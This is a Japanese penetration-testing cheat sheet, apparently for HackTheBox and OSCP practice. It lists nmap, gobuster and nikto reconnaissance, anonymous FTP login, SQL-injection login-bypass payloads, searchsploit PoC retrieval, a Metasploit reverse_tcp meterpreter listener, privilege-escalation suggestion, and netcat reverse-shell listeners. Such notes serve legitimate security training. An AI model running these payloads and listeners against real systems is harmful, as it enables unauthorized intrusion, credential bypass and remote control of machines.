## 偵察

### 通信相手のOSを知る
```bash
ping -c 1 <IP>
````

- ttlの時間で判別する
    - `ttl=64` → Linux OS/Mac OS
    - `ttl=128` → Windows OS
    - `ttl=255` → UNIX OS/ネットワーク機器

---

### nmapポートスキャン

```bash
sudo nmap -vvv -sCV -T4 -p0-65535 -Pn <IP>
```


---

### Webサーバ上のディレクトリ列挙

- 特定のページにアクセスできる隠しファイルやフォルダを見つけるのに最適

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

- **ワードファイル候補**

```
/usr/share/wordlists/dirb/big.txt
```

---

### サブドメインの列挙

```bash
gobuster dns -d <IP> -w /usr/share/wordlists/subdomains.txt
```

---

### VHOST（仮想ホスト）の列挙

```bash
gobuster vhost -u http://<IP> -w /usr/share/wordlists/vhosts.txt
```

---

### サイト脆弱性スキャン

```bash
nikto -h http://<IP>
```

### FTP匿名ログイン

```bash
ftp <IP>
```

- ユーザー名: `anonymous` または `ftp`
- パスワード: 空欄でEnter

---

## Webサイトからの情報取得
### ログインフォームがあったら
- webappの名前とバージョンが分かれば、デフォルトのユーザーネーム、パスワードを検索して、試す
- SQLインジェクション
	- ' OR 1=1;--
		- select * from users where username='' and password='' OR 1=1;
	- admin' OR 1=1;--
		- select * from users where username='admin' and password='' OR 1=1;
	- 詳しいことは
		- https://scrapbox.io/tadanomemo777/SQL%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3

### htmlソースでの検索
- コメントの検索
	- 内部IPアドレスやAPIキー、パスワードが見つかることもある
	- 検索ボックスに「```<!--```」を入れて検索
- CMSについての検索
	- CMSが使われていればCMSの脆弱性をつくこともできる
	- 検索ボックスに
		- wordpress
		- drupal
		- joomla
	- を入れて検索
### Burp Suite
- TargetタブのStitemapからも概要がわかる

### `curl`での確認

`md`ファイルなどはブラウザよりも`curl`での確認が見やすい。

```bash
curl -k <URL>
```

- `-k`：エラーを無視するオプション

### Webサイトのヘッダー情報の取得
CMS、JavaScriptライブラリ、ウェブサーバ、バージョン番号、ウェブフレームワークの取得

```bash
sudo whatweb http://<IP>
```


---

## 脆弱性の探索

### XSS (Cross Site Script)

HTBやOSCPではXSSの脆弱性を使うことはないため、真っ先に除外する。  
XSSは他のユーザーが引っかかる必要があるが、HTBやOSCPには対象が存在しない。

### Searchsploit
#### 複数の脆弱性を見つけたとき
 .txtよりもコードが書かれた脆弱性を選ぶべき
 迷った時は数字が後の方の方を選ぶべし
  より最新で、上手くいく可能性が高いから

#### PoCをダウンロードしたい時
 searchsploit -m <脆弱性の番号>
  - -m : ミラー

#### 使い方だけ出力したい
	 | grep -i usage <PoC file>


---

## Exploit

### リバースシェルの作成
https://www.revshells.com/

### 攻撃者側のサーバー内のファイルをやられ側に移す

 ```bash
 python -m http.server 80
 ```

  攻撃者サーバーを一時的にwebサーバーとする
  
### Metasploit 

#### リバースシェルリスナーの設置


```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
set ExitOnSession false
exploit -j -z
```




---

#### **セッション管理**

#### **セッション一覧表示**

```bash
sessions -l
```

#### **セッション接続・セッションに戻る**

```bash
sessions -i <セッション番号>
```

####  **セッション全終了**
se
```bash
sessions -K
```


---

#### **特権昇格の発見とエクスプロイト**

##### **local_exploit_suggester を使う**

Mesterpreterでユーザー権限でセッションが確立している時、**`local_exploit_suggester`** モジュールを使用して、ターゲットシステムに適した特権昇格エクスプロイトを提案させることができます。

```bash
use post/multi/recon/local_exploit_suggester
```

---
## Exploit後
### シェルアップデート
- linux
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
- windows
- 方法 : rlwrap は、コマンドラインの入力履歴や補完機能を提供するラッパープログラムです。これを nc と組み合わせることで、シェルの機能を強化できます。

```bash
rlwrap nc -lvnp <ポート番号>  # リスナー側 (攻撃者マシン)
```






